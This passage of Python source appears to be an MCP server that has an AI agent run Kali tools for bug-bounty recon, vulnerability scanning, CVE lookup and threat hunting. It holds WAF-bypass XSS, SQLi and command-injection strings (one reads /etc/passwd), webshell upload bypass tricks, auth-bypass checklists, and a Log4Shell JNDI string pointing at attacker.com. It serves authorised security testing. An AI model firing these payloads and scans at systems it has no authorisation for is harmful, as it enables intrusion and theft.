    vuln_types: list of vuln classes to hunt e.g. ['xss', 'sqli', 'ssrf', 'ssti', 'lfi']
    Runs: nuclei (CVEs + top vulns) → dalfox (XSS) → sqlmap (SQLi) → paramspider → arjun
    """
    logger.info(f"🏹 BB-VULN-HUNT: {target} | vulns={vuln_types}")
    context, sid = _context_for(target, session_id)
    vuln_types = vuln_types or ["xss", "sqli", "ssrf", "ssti", "lfi", "rce"]
    results = {}

    # Always run nuclei with high-impact templates
    results["nuclei"] = await run_kali_tool(
        tool="nuclei", target=target,
        options=f"-severity high,critical -tags cve,rce,sqli,xss,ssrf -as",
        session_id=sid, allow_dangerous=allow_dangerous,
    )

    if "xss" in vuln_types:
        results["dalfox"] = await run_kali_tool(
            tool="dalfox", target=target,
            options=f"url {target} --silence", session_id=sid, allow_dangerous=allow_dangerous,
        )

    if "sqli" in vuln_types:
        results["sqlmap"] = await run_kali_tool(
            tool="sqlmap", target=target,
            options="-u --batch --level=2 --risk=1 --random-agent",
            session_id=sid, allow_dangerous=allow_dangerous,
        )

    # Parameter discovery first for deeper testing
    results["paramspider"] = await run_kali_tool(
        tool="paramspider", target=target,
        options="-s", session_id=sid,
    )

    return {"session_id": sid, "target": target, "vuln_types": vuln_types, "results": results}


@mcp.tool()
async def bugbounty_osint_gathering(
    target: str,
    company: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Bug bounty OSINT gathering — collect open-source intelligence about target.
    Runs: theHarvester → whois → amass (intel) → shodan CLI → github dorking tips
    company: company name for employee and email enumeration
    """
    logger.info(f"🕵️  BB-OSINT: {target} | company={company}")
    context, sid = _context_for(target, session_id)
    results = {}

    results["theHarvester"] = await run_kali_tool(
        tool="theHarvester", target=target,
        options=f"-d -b all -l 100", session_id=sid,
    )
    results["whois"] = await run_kali_tool(
        tool="whois", target=target, options="", session_id=sid,
    )
    results["amass_intel"] = await run_kali_tool(
        tool="amass", target=target,
        options=f"intel -d -whois -org '{company}'" if company else "intel -d -whois",
        session_id=sid,
    )

    # Provide manual dorking suggestions
    dorks = {
        "github": f"site:github.com {target} password OR secret OR key OR token",
        "google_admin": f"site:{target} admin OR login OR dashboard",
        "google_backup": f"site:{target} ext:bak OR ext:sql OR ext:conf",
        "shodan": f"hostname:{target}",
        "censys": f"parsed.names:{target}",
    }

    return {"session_id": sid, "target": target, "company": company,
            "results": results, "manual_dorks": dorks}


@mcp.tool()
async def bugbounty_comprehensive_assessment(
    target: str,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Bug bounty comprehensive assessment — full end-to-end automated assessment pipeline.
    Phase 1: Recon → Phase 2: Discovery → Phase 3: Vuln Scan → Phase 4: Manual Hints
    """
    logger.info(f"🎯 BB-COMPREHENSIVE: {target}")
    context, sid = _context_for(target, session_id)

    # Phase 1: Recon
    recon = await bugbounty_reconnaissance_workflow(target=target, session_id=sid)

    # Phase 2: Directory + parameter discovery
    discovery = {}
    discovery["ffuf"] = await run_kali_tool(
        tool="ffuf", target=f"{target}/FUZZ",
        options=f"-w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307 -s",
        session_id=sid,
    )
    discovery["paramspider"] = await run_kali_tool(
        tool="paramspider", target=target,
        options="-s", session_id=sid,
    )

    # Phase 3: Vuln scanning
    vuln = {}
    vuln["nuclei"] = await run_kali_tool(
        tool="nuclei", target=target,
        options="-severity medium,high,critical -as",
        session_id=sid, allow_dangerous=allow_dangerous,
    )
    vuln["wafw00f"] = await run_kali_tool(
        tool="wafw00f", target=target, options="", session_id=sid,
    )

    # Phase 4: manual hints
    manual_hints = [
        "Test all discovered parameters for SQLi, XSS, SSRF, and SSTI",
        "Check for IDOR on numeric IDs in API endpoints",
        "Test authentication flows for bypass (JWT alg:none, OAuth misconfig)",
        "Fuzz file upload endpoints for extension and MIME bypass",
        "Check for mass assignment in JSON body parameters",
        "Test rate limiting on auth endpoints (login, reset password, OTP)",
        "Look for exposed .git, .env, backup files in discovered paths",
    ]

    return {
        "session_id": sid, "target": target,
        "recon": recon, "discovery": discovery, "vuln_scan": vuln,
        "manual_hints": manual_hints,
    }


@mcp.tool()
async def bugbounty_authentication_bypass_testing(
    target: str,
    login_url: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Authentication bypass testing — test for common auth weaknesses in bug bounty targets.
    Tests: JWT vulnerabilities, OAuth misconfig, default credentials, password spray hints,
           account enumeration, session fixation, and 2FA bypass paths.
    """
    logger.info(f"🔐 BB-AUTH-BYPASS: {target} | login={login_url}")
    context, sid = _context_for(target, session_id)
    results = {}
    checklist = {
        "jwt_none_alg": "Change JWT algorithm to 'none' and remove signature",
        "jwt_hs256_rsa_confusion": "If RS256, try signing with public key using HS256",
        "jwt_weak_secret": "Brute-force JWT secret with jwt_tool or hashcat mode 16500",
        "oauth_state_bypass": "Check if OAuth state parameter is validated",
        "oauth_redirect_uri": "Test open redirect in redirect_uri parameter",
        "default_creds": "Try admin:admin, admin:password, root:root, test:test",
        "password_spray": "Try common passwords against discovered usernames",
        "account_enumeration": "Compare response times/messages for valid vs invalid users",
        "session_fixation": "Set session ID before login, check if it persists after",
        "2fa_bypass": "Try skipping 2FA step directly, reuse old OTP, test rate limit",
        "remember_me_forgery": "Analyze remember-me cookie structure for predictability",
        "password_reset_flaw": "Test for host header injection in reset emails",
    }

    # Run JWT analyzer on any discovered tokens
    results["wafw00f"] = await run_kali_tool(
        tool="wafw00f", target=target, options="", session_id=sid,
    )
    if login_url:
        results["nikto"] = await run_kali_tool(
            tool="nikto", target=login_url,
            options="-h -Tuning 4", session_id=sid,
        )

    return {
        "session_id": sid, "target": target, "login_url": login_url,
        "checklist": checklist, "results": results,
        "tools_to_run": ["jwt_tool", "sqlmap --forms", "hydra", "burpsuite"],
    }


@mcp.tool()
async def bugbounty_file_upload_testing(
    target: str,
    upload_url: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    File upload vulnerability testing — comprehensive upload bypass payload set.
    Tests extension bypass, MIME bypass, path traversal, and webshell upload techniques.
    """
    logger.info(f"📁 BB-FILE-UPLOAD: {target} | upload_url={upload_url}")
    bypass_payloads = _payload_gen.generate_upload_bypass_set("php")
    nuclei_result = await run_kali_tool(
        tool="nuclei", target=upload_url or target,
        options="-u -tags file-upload -silent",
        session_id=session_id, allow_dangerous=allow_dangerous,
    )
    manual_checklist = [
        "Upload .php with Content-Type: image/jpeg",
        "Try double extension: shell.php.jpg, shell.jpg.php",
        "Try null byte: shell.php%00.jpg (legacy PHP)",
        "Try case variation: shell.PhP, shell.PHP5, shell.phtml",
        "Upload SVG with XSS payload in <svg> tag",
        "Try ZIP/archive containing path traversal: ../../../shell.php",
        "Upload valid image then change extension server-side",
        "Test for SSRF via SVG with external entity references",
        "Check if uploaded file is served without Content-Disposition",
        "Test size limits and magic byte validation",
    ]
    return {
        "session_id": session_id, "target": target, "upload_url": upload_url,
        "bypass_payloads": bypass_payloads,
        "nuclei_result": nuclei_result.get("output", "")[:2000],
        "manual_checklist": manual_checklist,
    }


@mcp.tool()
async def bugbounty_business_logic_testing(
    target: str,
    api_base: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Business logic vulnerability testing — identify flaws in application workflows.
    Tests: IDOR, price manipulation, race conditions, workflow bypass, and mass assignment.
    """
    logger.info(f"💼 BB-BIZ-LOGIC: {target}")
    checklist = {
        "idor": {
            "desc": "Insecure Direct Object Reference",
            "tests": [
                "Replace numeric IDs with other users' IDs in API calls",
                "Try GUID enumeration with sequential patterns",
                "Test horizontal privilege escalation across accounts",
                "Check indirect references via hash parameters",
            ],
        },
        "price_manipulation": {
            "desc": "Price/quantity manipulation in e-commerce flows",
            "tests": [
                "Modify price parameters in hidden form fields",
                "Set quantity to negative values",
                "Replay discounted cart request after price change",
                "Test coupon stacking and code reuse",
            ],
        },
        "race_condition": {
            "desc": "Race condition in critical operations",
            "tests": [
                "Send simultaneous requests to redeem coupon/gift card",
                "Parallel requests to transfer funds/points",
                "Race single-use token consumption",
                "Turbo intruder parallel requests on balance operations",
            ],
        },
        "workflow_bypass": {
            "desc": "Multi-step workflow bypass",
            "tests": [
                "Skip payment step and go directly to order confirmation",
                "Replay success response after failed payment",
                "Access post-authentication pages without completing auth",
                "Bypass email verification by direct API call",
            ],
        },
        "mass_assignment": {
            "desc": "Mass assignment / parameter pollution",
            "tests": [
                "Add 'role', 'isAdmin', 'plan', 'credits' to POST body",
                "Try JSON key injection in API requests",
                "Check for unfiltered model binding in PUT/PATCH",
                "Test parameter precedence with duplicate keys",
            ],
        },
    }
    profile = _intelligence.build_profile(target=target)
    return {
        "target": target, "api_base": api_base or target,
        "target_type": profile.target_type.value,
        "checklist": checklist,
        "recommended_tools": ["burpsuite", "turbo_intruder", "http_intruder_readonly"],
        "automation_commands": [
            f"ffuf -u {api_base or target}/api/users/FUZZ -w /usr/share/wordlists/dirb/common.txt" if api_base else "",
            "nuclei -u <target> -tags idor,business-logic -silent",
        ],
    }


# ============================================================================
# HELPERS
# ============================================================================

def _recommend_workflow(target_type: str) -> str:
    mapping = {
        "web": "web_pentest", "api": "api_testing", "network": "network_pentest",
        "cloud": "aws_assessment", "container": "container_assessment",
        "binary": "binary_exploit", "mobile": "web_pentest",
    }
    return mapping.get(target_type, "comprehensive")


def _get_tool_purpose(tool: str) -> str:
    from tools.registry import get_tool
    info = get_tool(tool)
    return info.get("description", f"Run {tool}") if info else f"Run {tool}"


def _build_vuln_checklist(profile) -> list[dict]:
    checks = []
    if profile.target_type.value == "web":
        checks = [
            {"id": "WEB-01", "check": "SQL Injection", "tool": "sqlmap", "cvss": 9.8, "priority": "critical"},
            {"id": "WEB-02", "check": "Cross-Site Scripting (XSS)", "tool": "dalfox", "cvss": 7.2, "priority": "high"},
            {"id": "WEB-03", "check": "Server-Side Template Injection", "tool": "nuclei", "cvss": 9.1, "priority": "critical"},
            {"id": "WEB-04", "check": "Authentication Bypass", "tool": "burpsuite", "cvss": 8.8, "priority": "high"},
            {"id": "WEB-05", "check": "Insecure Direct Object Reference", "tool": "manual", "cvss": 7.5, "priority": "high"},
            {"id": "WEB-06", "check": "Server-Side Request Forgery", "tool": "ssrfmap", "cvss": 8.6, "priority": "high"},
            {"id": "WEB-07", "check": "File Upload Bypass", "tool": "manual", "cvss": 8.1, "priority": "high"},
            {"id": "WEB-08", "check": "Path Traversal / LFI", "tool": "dotdotpwn", "cvss": 7.5, "priority": "medium"},
        ]
    elif profile.target_type.value == "network":
        checks = [
            {"id": "NET-01", "check": "Default Credentials", "tool": "hydra", "cvss": 9.8, "priority": "critical"},
            {"id": "NET-02", "check": "SMB Vulnerabilities (EternalBlue)", "tool": "metasploit", "cvss": 9.8, "priority": "critical"},
            {"id": "NET-03", "check": "LLMNR/NBT-NS Poisoning", "tool": "responder", "cvss": 8.8, "priority": "high"},
            {"id": "NET-04", "check": "Kerberoasting / AS-REP Roasting", "tool": "impacket-GetNPUsers", "cvss": 7.5, "priority": "high"},
            {"id": "NET-05", "check": "Password Spraying", "tool": "kerbrute", "cvss": 7.2, "priority": "medium"},
            {"id": "NET-06", "check": "SNMP Community String Disclosure", "tool": "onesixtyone", "cvss": 5.3, "priority": "medium"},
        ]
    elif profile.target_type.value == "cloud":
        checks = [
            {"id": "CLD-01", "check": "IAM Privilege Escalation", "tool": "pacu", "cvss": 9.8, "priority": "critical"},
            {"id": "CLD-02", "check": "S3 Bucket Misconfiguration", "tool": "scout-suite", "cvss": 8.2, "priority": "high"},
            {"id": "CLD-03", "check": "Metadata Service Exposure (SSRF)", "tool": "ssrfmap", "cvss": 8.6, "priority": "high"},
            {"id": "CLD-04", "check": "Secrets in Environment Variables", "tool": "trufflehog", "cvss": 7.5, "priority": "high"},
            {"id": "CLD-05", "check": "Publicly Exposed Security Groups", "tool": "prowler", "cvss": 7.1, "priority": "medium"},
        ]
    else:
        checks = [
            {"id": "GEN-01", "check": "Open Ports / Service Enumeration", "tool": "nmap", "cvss": 5.0, "priority": "medium"},
            {"id": "GEN-02", "check": "Known CVEs for Detected Services", "tool": "nuclei", "cvss": 7.5, "priority": "high"},
            {"id": "GEN-03", "check": "Default Credentials", "tool": "hydra", "cvss": 9.8, "priority": "critical"},
            {"id": "GEN-04", "check": "Web Application Vulnerabilities", "tool": "nikto", "cvss": 6.5, "priority": "medium"},
        ]
    return sorted(checks, key=lambda c: c["cvss"], reverse=True)


def _estimate_findings(profile) -> dict:
    surface = profile.attack_surface
    return {
        "critical": int(surface * 0.1),
        "high": int(surface * 0.3),
        "medium": int(surface * 0.5),
        "low": int(surface * 1.0),
        "info": int(surface * 2.0),
    }


def _get_tech_specific_tests(technologies: list, cms: str) -> list[str]:
    tests = []
    tech_tests = {
        "php": ["PHP object injection", "LFI/RFI", "PHP type juggling"],
        "wordpress": ["WPScan plugin audit", "XML-RPC brute force", "Theme vulnerabilities"],
        "joomla": ["Joomla component vulns", "Admin panel brute force"],
        "django": ["Debug mode check", "SSTI in templates", "CSRF validation"],
        "rails": ["Ruby deserialization", "Mass assignment", "SSTI"],
        "nodejs": ["Prototype pollution", "SSJI", "Path traversal"],
        "java": ["Deserialization", "Spring Boot actuators", "Java expression injection"],
        "asp.net": [".NET deserialization", "ViewState manipulation", "IIS misconfig"],
        "nginx": ["Off-by-slash", "CRLF injection", "Alias path traversal"],
        "apache": ["RCE via mod_cgi", "Path traversal", "Apache Struts"],
    }
    for tech in [t.lower() for t in (technologies or [])]:
        for key, tips in tech_tests.items():
            if key in tech:
                tests.extend(tips)
    if cms:
        for key, tips in tech_tests.items():
            if key in cms.lower():
                tests.extend(tips)
    return list(dict.fromkeys(tests))[:10]


def _apply_evasion(payloads: list, level: int) -> list:
    import urllib.parse
    if level == 0:
        return payloads
    results = []
    for p in payloads:
        if level >= 1:
            results.append(urllib.parse.quote(p))
        if level >= 2:
            results.append(urllib.parse.quote(urllib.parse.quote(p)))
        if level >= 3:
            results.append(p.replace("<", "\\u003c").replace(">", "\\u003e"))
            results.append("".join(f"\\x{ord(c):02x}" if ord(c) > 127 else c for c in p))
    return list(dict.fromkeys(results))


def _get_waf_bypass_techniques(vuln_class: str, level: int) -> list[str]:
    techniques = {
        "xss": ["HTML entity encoding: &lt;script&gt;", "Unicode: \\u003cscript\\u003e",
                "Double encoding: %253cscript%253e", "Case variation: <ScRiPt>",
                "SVG payload: <svg onload=alert(1)>", "Template: ${alert(1)}"],
        "sqli": ["Comment bypass: /*!SELECT*/", "Case variation: SeLeCt",
                 "URL encoding: %27 for '", "Double encoding: %2527",
                 "Whitespace: /**/", "Inline comments: SE/**/LECT"],
        "rce": ["Backtick: `id`", "Dollar sign: $(id)", "Pipe: ;id",
                "URL encoding: %60id%60", "IFS bypass: ${IFS}cat${IFS}/etc/passwd"],
    }
    base = techniques.get(vuln_class, ["URL encode", "Double encode", "Case variation"])
    return base[:level * 2 + 1]


def _identify_zeroday_surface(profile, known_cves: list) -> list[dict]:
    areas = []
    if profile.target_type.value == "web":
        areas.extend([
            {"area": "Custom file parsers", "risk": "high", "method": "fuzzing"},
            {"area": "Authentication edge cases", "risk": "high", "method": "manual"},
            {"area": "Input validation bypasses", "risk": "medium", "method": "fuzzing"},
            {"area": "Business logic flaws", "risk": "high", "method": "manual"},
        ])
    if profile.technologies:
        for tech in profile.technologies[:3]:
            areas.append({"area": f"{tech} version-specific bugs", "risk": "medium",
                          "method": "searchsploit + nuclei"})
    return areas


def _get_research_priorities(profile) -> list[str]:
    if profile.target_type.value == "binary":
        return ["Stack buffer overflow", "Heap exploitation", "Format string bugs", "Use-after-free"]
    elif profile.target_type.value == "web":
        return ["Input validation", "Authentication logic", "File handling", "Deserialization"]
    elif profile.target_type.value == "cloud":
        return ["IAM policies", "Storage permissions", "Network exposure", "Secrets management"]
    return ["Service vulnerabilities", "Default configurations", "Authentication weaknesses"]


def _get_fuzzing_targets(profile) -> list[str]:
    if profile.target_type.value == "web":
        return ["HTTP parameters", "JSON/XML body", "File upload", "HTTP headers", "Cookies"]
    elif profile.target_type.value == "binary":
        return ["stdin input", "File arguments", "Environment variables", "Network packets"]
    elif profile.target_type.value == "network":
        return ["Protocol fields", "Authentication handshake", "Protocol state machine"]
    return ["All inputs", "Configuration files", "API endpoints"]


def _build_cve_intelligence(techs: list, severity: str, days: int) -> list[dict]:
    sev_map = {"low": 1, "medium": 2, "high": 3, "critical": 4}
    min_sev = min(sev_map.get(s.strip(), 1) for s in severity.split(","))
    results = []
    known_cves = {
        "apache": [{"cve": "CVE-2021-41773", "desc": "Path traversal/RCE in Apache 2.4.49", "cvss": 9.8}],
        "log4j": [{"cve": "CVE-2021-44228", "desc": "Log4Shell JNDI injection RCE", "cvss": 10.0}],
        "spring": [{"cve": "CVE-2022-22965", "desc": "Spring4Shell RCE", "cvss": 9.8}],
        "openssh": [{"cve": "CVE-2024-6387", "desc": "regreSSHion race condition", "cvss": 8.1}],
        "php": [{"cve": "CVE-2024-4577", "desc": "PHP CGI argument injection", "cvss": 9.8}],
        "wordpress": [{"cve": "CVE-2024-27956", "desc": "WP SQL injection", "cvss": 9.9}],
        "nginx": [{"cve": "CVE-2023-44487", "desc": "HTTP/2 Rapid Reset (DoS)", "cvss": 7.5}],
    }
    for tech in techs:
        for key, cves in known_cves.items():
            if key in tech.lower():
                for cve in cves:
                    if (cve["cvss"] >= 7.0 and min_sev >= 3) or \
                       (cve["cvss"] >= 4.0 and min_sev >= 2) or \
                       (cve["cvss"] >= 0 and min_sev >= 1):
                        results.append({**cve, "technology": tech,
                                        "nuclei_template": f"cves/{cve['cve'].lower()}.yaml"})
    return results


def _get_cve_intelligence(cve_id: str) -> dict:
    cve_db = {
        "CVE-2021-44228": {"name": "Log4Shell", "severity": "CRITICAL", "cvss": 10.0,
                           "affected": "Apache Log4j 2.x", "type": "RCE via JNDI injection",
                           "exploitation_notes": ["Send ${jndi:ldap://attacker.com/a} in any logged header",
                                                  "X-Forwarded-For, User-Agent, X-Api-Version"],
                           "remediation": "Update Log4j to 2.17.1+"},
        "CVE-2022-22965": {"name": "Spring4Shell", "severity": "CRITICAL", "cvss": 9.8,
                           "affected": "Spring MVC / Spring WebFlux", "type": "RCE via data binding",
                           "exploitation_notes": ["Requires Java 9+, Tomcat deployment"],
                           "remediation": "Update Spring Framework to 5.3.18+ or 5.2.20+"},
        "CVE-2024-6387": {"name": "regreSSHion", "severity": "HIGH", "cvss": 8.1,
                          "affected": "OpenSSH < 9.8p1", "type": "Race condition RCE",
                          "exploitation_notes": ["Requires ~10000 connection attempts", "glibc x86-64 only"],
                          "remediation": "Update OpenSSH to 9.8p1+"},
    }
    return cve_db.get(cve_id.upper(), {
        "name": cve_id, "severity": "UNKNOWN", "cvss": 0.0,
        "affected": "Unknown", "type": "Unknown",
        "exploitation_notes": ["Check NVD/Mitre for details", "Use searchsploit for exploits"],
        "remediation": "Apply vendor-provided patch",
    })


def _build_threat_hunt_plan(target: str, actor: str, ttps: list, logs: list) -> dict:
    actor_ttps = {
        "apt29": ["T1059.001", "T1078", "T1003.001", "T1071.001", "T1560"],
        "lazarus": ["T1059.003", "T1105", "T1027", "T1083"],
        "ransomware": ["T1486", "T1490", "T1489", "T1078", "T1021.002"],
    }
    effective_ttps = ttps or actor_ttps.get(actor.lower(), ["T1059", "T1003", "T1078", "T1071"])
    hypotheses = [f"Adversary used TTP {t} against {target}" for t in effective_ttps[:5]]
    ioc_patterns = {
        "process": ["cmd.exe /c", "powershell -enc", "certutil -decode", "mshta.exe"],
        "network": ["beaconing intervals", "unusual outbound ports", "DNS tunneling patterns"],
        "file": ["*.exe in %TEMP%", "*.dll in AppData", "renamed system binaries"],
        "registry": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
    }
    queries = {
        "windows_event": [
            "EventID:4688 AND CommandLine:(*powershell* OR *cmd*)",
            "EventID:4624 AND LogonType:3",
            "EventID:7045 (new service installed)",
        ],
        "syslog": ["Failed password", "sudo:", "su[", "Accepted publickey"],
        "network_flow": [f"dst_port NOT IN (80,443,53) AND bytes > 1000000"],
    }
    return {
        "hypotheses": hypotheses,
        "ioc_patterns": ioc_patterns,
        "detection_queries": {src: queries.get(src, [f"Hunt for {src} anomalies"]) for src in (logs or list(queries.keys()))},
        "mitre_mappings": [{
            "technique": t,
            "tactic": _ttp_to_tactic(t),
            "hunt_query": f"Search for {t} indicators",
        } for t in effective_ttps],
    }


def _ttp_to_tactic(ttp: str) -> str:
    mapping = {
        "T1059": "Execution", "T1078": "Defense Evasion / Persistence",
        "T1003": "Credential Access", "T1071": "Command and Control",
        "T1486": "Impact", "T1490": "Impact", "T1105": "Command and Control",
        "T1021": "Lateral Movement", "T1560": "Collection",
    }
    return mapping.get(ttp[:5], "Unknown Tactic")


def _detect_ioc_type(ioc: str) -> str:
    import re
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ioc):
        return "ip"
    elif re.match(r'^[0-9a-f]{32}$', ioc, re.I) or re.match(r'^[0-9a-f]{40}$', ioc, re.I) or re.match(r'^[0-9a-f]{64}$', ioc, re.I):
        return "hash"
    elif re.match(r'^https?://', ioc):
        return "url"
    elif re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', ioc):
        return "domain"
    elif '@' in ioc:
        return "email"
    return "unknown"


def _analyze_ioc(ioc: str, ioc_type: str, context: str) -> dict:
    reputation_signals = {
        "ip": ["Check Shodan/Censys for exposed services", "Verify against Spamhaus/AbuseIPDB"],
        "domain": ["Check WHOIS for registration age", "Verify DNS history", "Check VirusTotal"],
        "hash": ["Search MalwareBazaar", "Check VirusTotal detections", "Search ANY.RUN"],
        "url": ["Check URLhaus", "Analyze redirect chain", "Check certificate transparency"],
        "email": ["Check HaveIBeenPwned", "Verify SPF/DKIM records"],
    }
    return {
        "ioc": ioc,
        "type": ioc_type,
        "context": context,
        "analysis_steps": reputation_signals.get(ioc_type, ["Manual investigation required"]),
        "threat_level": "unknown",
        "tools": ["virustotal", "shodan", "maltego", "spiderfoot"],
    }


def _correlate_threat_actors(analyses: list) -> list[str]:
    return ["Manual correlation required — check ThreatConnect, MISP, or OpenCTI for IOC attribution"]


def _infer_attack_phase(analyses: list) -> str:
    return "Unknown — correlate IOC types: IPs suggest C2, hashes suggest malware delivery, domains suggest phishing or C2"


def _get_threat_response_actions(analyses: list) -> list[str]:
    return [
        "Block identified IPs at perimeter firewall",
        "Submit hashes to AV vendors for detection",
        "Notify affected users of phishing domains",
        "Preserve forensic artifacts before remediation",
        "Initiate incident response playbook",
    ]


def _map_iocs_to_mitre(analyses: list) -> list[dict]:
    type_mapping = {
        "ip": {"technique": "T1071", "name": "Application Layer Protocol (C2)"},
        "domain": {"technique": "T1071", "name": "Application Layer Protocol (C2)"},
        "hash": {"technique": "T1204", "name": "User Execution: Malicious File"},
        "url": {"technique": "T1566", "name": "Phishing"},
        "email": {"technique": "T1566.001", "name": "Spearphishing Attachment"},
    }
    seen = set()
    mappings = []
    for a in analyses:
        t = a.get("type", "unknown")
        if t not in seen and t in type_mapping:
            seen.add(t)
            mappings.append(type_mapping[t])
    return mappings


def _infer_entry_points(profile) -> list[str]:
    entry = []
    if 80 in profile.open_ports or 443 in profile.open_ports:
        entry.append("web")
    if 22 in profile.open_ports:
        entry.append("ssh")
    if 445 in profile.open_ports or 139 in profile.open_ports:
        entry.append("smb")
    if 3389 in profile.open_ports:
        entry.append("rdp")
    if not entry:
        entry = ["unknown"]
    return entry


def _estimate_cve_exposure(profile) -> list[dict]:
    exposure = []
    for tech in (profile.technologies or [])[:3]:
        exposure.append({
            "technology": tech,
            "estimated_cves": "run: nuclei -t cves/ -u <target>",
            "check": f"searchsploit {tech}",
        })
    return exposure


def _context_for(target: str, session_id: str) -> tuple[SessionContext, str]:
    if session_id:
        context = sessions.load_context(session_id)
        sessions.mark_active(session_id)
        return context, session_id
    context = SessionContext(target=target, scope=[target])
    sid = sessions.create_session(target, context.scope)
    return context, sid


_URL_TARGET_TOOLS = {
    "arjun", "commix", "corsy", "crlfuzz", "dalfox", "dirb", "dirsearch",
    "dotdotpwn", "feroxbuster", "ffuf", "gobuster", "graphqlmap", "hakrawler",
    "jaeles", "katana", "nikto", "nuclei", "smuggler", "wafw00f", "wfuzz", "whatweb",
    "wpscan", "x8", "xsser", "zaproxy", "zap-baseline.py", "zap-full-scan.py",
    "zap-api-scan.py",
}

_DOMAIN_TARGET_TOOLS = {
    "amass", "dnsenum", "dnsrecon", "fierce", "gau", "metagoofil",
    "paramspider", "subfinder", "theHarvester", "waybackurls",
}


def _normalize_target_for_tool(tool: str, target: str) -> str:
    """Adapt user targets to the shape each CLI expects."""
    value = (target or "").strip()
    if not value:
        return value

    if tool in _DOMAIN_TARGET_TOOLS:
        parsed = urlparse(value if "://" in value else f"//{value}")
        host = parsed.hostname or value.split("/", 1)[0]
        return host.strip("[]")

    if tool in _URL_TARGET_TOOLS and "://" not in value:
        return f"http://{value.strip('/')}"

    if tool in {"ffuf", "wfuzz"}:
        return value.rstrip("/")

    return value


def _build_command(tool: str, target: str, options: str) -> str:
    info = get_tool(tool) or {}
    sudo = "sudo " if info.get("requires_root") else ""
    command_name = info.get("command", tool)
    always_flags = info.get("always_flags", "")
    effective_target = _normalize_target_for_tool(tool, target)
    quoted_target = shlex.quote(effective_target)

    if options.strip():
        options_text = options.strip()
        target_flag = info.get("target_flag", "")
        if info.get("stdin_target"):
            cmd = f"printf '%s\\n' {quoted_target} | {command_name} {options_text}"
        else:
            cmd = ""
        # Check if target is already in the options to avoid duplicates
        target_already_in_options = any(
            candidate and candidate in options_text
            for candidate in {target, effective_target, quoted_target}
        )

        if cmd:
            pass
        elif not target_flag and not target_already_in_options:
            # No target_flag defined — append target directly (or before options
            # for tools that require positional host-first arguments).
            if info.get("target_before_options"):
                cmd = f"{command_name} {quoted_target} {options_text}"
            else:
                cmd = f"{command_name} {options_text} {quoted_target}"
        elif target_flag and target_flag in options_text and not target_already_in_options:
            # Target flag was provided without its value. Put the target right
            # after the flag so tools like WPScan do not parse it as an option.
            updated_options = re.sub(
                rf"({re.escape(target_flag)})(?=\s|$)",
                lambda match: f"{match.group(1)} {quoted_target}",
                options_text,
                count=1,
            )
            cmd = f"{command_name} {updated_options}"
        elif target_flag and target_flag not in options_text and not target_already_in_options:
            # Target flag defined and not in options — use flag format
            if info.get("target_before_options"):
                cmd = f"{command_name} {target_flag} {quoted_target} {options_text}"
            else:
                cmd = f"{command_name} {options_text} {target_flag} {quoted_target}"
        else:
            # Target already in options or target_flag is in options — don't add again
            cmd = f"{command_name} {options_text}"
    else:
        example = info.get("example", f"{tool} <target>")
        # Prevent CIDR duplication from examples like "nbtscan <target>/24"
        # when callers already pass a CIDR target (e.g. 192.168.0.0/24).
        if "/" in effective_target:
            example = re.sub(r"<[^>\s]+>/\d{1,2}", "<target>", example)
        cmd = re.sub(r"<[^>\s]+>", quoted_target, example)

    # Append always_flags if not already present in the command
    if always_flags:
        import re as _re
        for flag in _re.split(r'\s+(?=--|-(?=[a-z]))', always_flags.strip()):
            flag_name = flag.split()[0]  # just the flag name, not its value
            if flag_name not in cmd:
                cmd = f"{cmd} {flag}"

    return f"{sudo}{cmd}".strip()


def _find_workflow_by_name(name: str):
    text = name.lower().strip()
    for workflow in ALL_WORKFLOWS:
        names = [workflow.name.lower(), *[alias.lower() for alias in workflow.aliases]]
        if text in names:
            return workflow
    return None


def _classify_command_outcome(
    output: str,
    exit_code: int | None,
    timed_out: bool,
    blocked_reason: str = "",
) -> str:
    reason = (blocked_reason or "").lower()
    text = (output or "").lower()

    if reason:
        if "out-of-scope" in reason:
            return "blocked_scope"
        if "dangerous" in reason:
            return "blocked_dangerous"
        return "blocked"

    if timed_out:
        return "timeout"
    if exit_code == 0:
        return "success"

    if any(tok in text for tok in [
        "operation not permitted",
        "permission denied",
        "no new privileges",
        "could not determine network interfaces",
    ]):
        return "permission_denied"
    if any(tok in text for tok in ["not found", "no such file or directory"]):
        return "tool_missing"
    if any(tok in text for tok in ["malformed ip address", "expected one argument", "usage:"]):
        return "invalid_arguments"
    if any(tok in text for tok in [
        "connection refused",
        "can't contact",
        "no response",
        "could not connect",
        "timed out",
    ]):
        return "target_unreachable"
    return "command_failed"


def _summarize_tool_result(tool: str, parsed: dict[str, Any], status: str) -> str:
    parts = []
    labels = [
        ("findings", "finding"),
        ("ports", "open port"),
        ("urls", "URL"),
        ("subdomains", "subdomain"),
        ("cves", "CVE"),
        ("credentials", "credential"),
        ("technologies", "technology"),
    ]
    for key, label in labels:
        count = int(parsed.get(key, 0) or 0)
        if count:
            plural = label if count == 1 else f"{label}s"
            parts.append(f"{count} {plural}")
    if parts:
        return f"{tool} produced {', '.join(parts)} ({status})"
    return f"{tool} finished with status: {status}"


def _should_run_workflow_step(condition: str, context: SessionContext) -> bool:
    condition_text = (condition or "always").lower().strip()
    if condition_text == "always":
        return True

    port_match = re.search(r"port\s+(\d+)", condition_text)
    if port_match:
        port = port_match.group(1)
        all_ports = [p for ports in context.open_ports.values() for p in ports]
        return any(p == port or p.startswith(f"{port}/") for p in all_ports)

    services_text = " ".join(context.services.values()).lower()
    findings_text = " ".join(f.detail for f in context.findings).lower()
    urls_text = " ".join(context.urls).lower()
    combined = f"{services_text} {findings_text} {urls_text}"

    keywords = {
        "wordpress": ["wordpress", "wp-content", "wp-includes", "wp-json"],
        "smb": ["smb", "samba", "microsoft-ds", "netbios", "445", "139"],
        "http": ["http", "https", "apache", "nginx", "iis", "80", "443"],
        "forms": ["form", "login", "submit", "input", "parameter"],
        "login": ["login", "signin", "auth", "ssh", "ftp", "rdp"],
    }
    for key, terms in keywords.items():
